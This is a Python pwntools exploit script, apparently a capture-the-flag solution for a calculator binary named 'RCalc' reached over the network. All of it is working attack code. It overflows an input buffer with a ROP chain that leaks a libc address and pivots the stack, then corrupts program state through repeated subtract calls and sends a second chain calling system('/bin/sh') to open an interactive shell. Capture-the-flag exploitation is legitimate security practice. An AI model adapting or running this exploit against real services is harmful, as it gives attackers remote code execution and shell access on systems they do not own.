#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('RCalc'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add(int1, int2, save=True):
    r.sendlineafter('choice:', '1')
    r.recvuntil('integer: ')
    r.sendline(str(int1))
    r.sendline(str(int2))
    r.sendlineafter('result? ', 'yes' if save else 'no')

def sub(int1, int2, save=True):
    r.sendlineafter('choice:', '2')
    r.recvuntil('integer: ')
    r.sendline(str(int1))
    r.sendline(str(int2))
    r.sendlineafter('result? ', 'yes' if save else 'no')

def exit():
    r.sendlineafter('choice:', '5')

r = remote(HOST, PORT)
pause()

pop_rdi = 0x401123
pop_rsi = 0x401121 # pop 2
str_aS = 0x401203
pop_rsp = 0x40111d # pop 3
buf = 0x602800

exp = flat(
    '\xff'*0x118,
    pop_rdi, 0x601ff0, elf.sym['puts']+6,
    #pop_rdi, 0, pop_rsi, elf.got['strncmp'] - 0x28, 0, elf.sym['read'],
    pop_rsi, 0, 0, # align
    pop_rdi, str_aS, pop_rsi, buf, 0, elf.sym['__isoc99_scanf'],
    pop_rsp, buf,
)
r.sendlineafter('pls: ', exp)

for i in range(0x23):
    sub(0, 1)

exit()
libc_base = r.leak() - libc.sym['__libc_start_main']
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address += libc_base

exp = flat(
    0, 0, 0,
    pop_rdi, libc.binsh, libc.sym['system'],
)
r.sendline(exp)
r.interactive()
